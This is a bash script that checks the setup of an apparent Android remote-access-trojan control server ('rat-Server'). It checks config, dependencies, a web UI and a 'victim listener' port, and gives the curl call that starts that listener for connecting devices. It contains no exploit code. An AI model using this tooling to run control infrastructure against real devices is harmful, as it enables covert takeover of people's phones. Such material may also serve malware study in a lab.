#!/bin/bash

# Server Setup Verification Script
# This script helps verify that the rat-Server is properly configured and accessible
#
# USAGE: Run this script from the repository root directory:
#   ./verify-server-setup.sh
#
# REQUIREMENTS:
#   - Must be run from the rat_custod repository root
#   - Server dependencies should be installed (npm install in rat-Server/)
#   - Node.js must be available on the system

# Note: Using set -e but with explicit error handling for optional checks
set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}RAT Server Configuration Verification${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

# Verify we're in the repository root
if [ ! -d "rat-Server" ]; then
    echo -e "${RED}Error: rat-Server directory not found!${NC}"
    echo "This script must be run from the repository root directory."
    echo ""
    echo "Usage:"
    echo "  cd /path/to/rat_custod"
    echo "  ./verify-server-setup.sh"
    exit 1
fi

# Check if config.json exists
echo -e "${YELLOW}[1/7] Checking config.json...${NC}"
if [ ! -f "rat-Server/config.json" ]; then
    echo -e "${RED}✗ config.json not found!${NC}"
    echo "Please create rat-Server/config.json with SERVER_IP and SERVER_PORT"
    exit 1
fi

# Read and display config
SERVER_IP=$(grep -o '"SERVER_IP"[^,]*' rat-Server/config.json | cut -d'"' -f4)
SERVER_PORT=$(grep -o '"SERVER_PORT"[^,}]*' rat-Server/config.json | cut -d':' -f2 | tr -d ' ')

echo -e "${GREEN}✓ config.json found${NC}"
echo "  SERVER_IP: $SERVER_IP"
echo "  SERVER_PORT: $SERVER_PORT"
echo ""

# Check if node_modules exists
echo -e "${YELLOW}[2/7] Checking dependencies...${NC}"
if [ ! -d "rat-Server/node_modules" ]; then
    echo -e "${RED}✗ Dependencies not installed${NC}"
    echo "Run: cd rat-Server && npm install"
    exit 1
fi
echo -e "${GREEN}✓ Dependencies are installed${NC}"
echo ""

# Check if main server is running (port 3000)
echo -e "${YELLOW}[3/7] Checking main server (port 3000)...${NC}"
# Disable set -e for this check as we want to handle the error gracefully
set +e
if nc -z localhost 3000 2>/dev/null || lsof -i :3000 >/dev/null 2>&1; then
    echo -e "${GREEN}✓ Main server is running on port 3000${NC}"
    SERVER_RUNNING=true
else
    echo -e "${RED}✗ Main server is not running on port 3000${NC}"
    echo "Start the server with: cd rat-Server && node server.js"
    SERVER_RUNNING=false
fi
set -e
echo ""

# Test config endpoint (only if server is running)
echo -e "${YELLOW}[4/7] Testing /api/config endpoint...${NC}"
if [ "$SERVER_RUNNING" = true ]; then
    if command -v curl &> /dev/null; then
        set +e
        RESPONSE=$(curl -s http://localhost:3000/api/config 2>/dev/null || echo "ERROR")
        set -e
        if [ "$RESPONSE" != "ERROR" ]; then
            echo -e "${GREEN}✓ Config endpoint is accessible${NC}"
            echo "  Response: $RESPONSE"
        else
            echo -e "${RED}✗ Config endpoint is not accessible${NC}"
        fi
    else
        echo -e "${YELLOW}⚠ curl not found, skipping endpoint test${NC}"
    fi
else
    echo -e "${YELLOW}⚠ Skipping (server not running)${NC}"
fi
echo ""

# Check if victim listener is running
echo -e "${YELLOW}[5/7] Checking victim listener (port $SERVER_PORT)...${NC}"
set +e
if nc -z localhost $SERVER_PORT 2>/dev/null || lsof -i :$SERVER_PORT >/dev/null 2>&1; then
    echo -e "${GREEN}✓ Victim listener is running on port $SERVER_PORT${NC}"
    LISTENER_RUNNING=true
else
    echo -e "${YELLOW}⚠ Victim listener is NOT running on port $SERVER_PORT${NC}"
    echo "  This is required for Android clients to connect!"
    echo ""
    echo "  Start the listener with:"
    echo "  curl -X POST http://localhost:3000/api/listen \\"
    echo "    -H \"Content-Type: application/json\" \\"
    echo "    -d '{\"port\": $SERVER_PORT}'"
    echo ""
    echo -e "${YELLOW}  Or use the web UI at http://localhost:3000 → Victims Lab → Start Listening${NC}"
    LISTENER_RUNNING=false
fi
set -e
echo ""

# Check network accessibility
echo -e "${YELLOW}[6/7] Checking network accessibility...${NC}"
if [ "$SERVER_IP" = "localhost" ] || [ "$SERVER_IP" = "127.0.0.1" ]; then
    echo -e "${RED}✗ SERVER_IP is set to localhost/127.0.0.1${NC}"
    echo "  Android clients won't be able to reach the server!"
    echo "  Update config.json with your machine's LAN IP address"
    echo ""
    echo "  Find your IP with:"
    echo "    - macOS/Linux: ifconfig | grep 'inet '"
    echo "    - Windows: ipconfig"
else
    echo -e "${GREEN}✓ SERVER_IP appears to be a network address${NC}"
    echo "  Make sure this IP is reachable from Android devices"
fi
echo ""

# Summary
echo -e "${YELLOW}[7/7] Summary${NC}"
echo "─────────────────────────────────────────"
echo "Main Server:"
echo "  • Web UI: http://localhost:3000"
echo "  • Config API: http://localhost:3000/api/config"
echo ""
echo "Victim Listener:"
echo "  • Port: $SERVER_PORT"
if [ "$LISTENER_RUNNING" = true ]; then
    echo "  • Status: Running ✓"
else
    echo "  • Status: Not started ✗"
fi
echo ""
echo "Android Client Configuration:"
echo "  • Will fetch: http://$SERVER_IP:3000/api/config"
echo "  • Will connect to: http://$SERVER_IP:$SERVER_PORT"
echo ""
echo "Next Steps:"
if [ "$SERVER_RUNNING" = false ]; then
    echo "  1. Install dependencies: cd rat-Server && npm install"
    echo "  2. Start the server: node server.js"
fi
if [ "$LISTENER_RUNNING" = false ] && [ "$SERVER_RUNNING" = true ]; then
    echo "  1. Start the victim listener (see above)"
fi
echo "  2. Build or install the Android APK"
echo "  3. Ensure Android device is on the same network"
echo "  4. Check firewall allows ports 3000 and $SERVER_PORT"
echo ""
echo "For detailed troubleshooting, see:"
echo "  • PORT_CONFIGURATION.md"
echo "  • DYNAMIC_CONFIG.md"
echo ""
echo -e "${GREEN}Verification complete!${NC}"
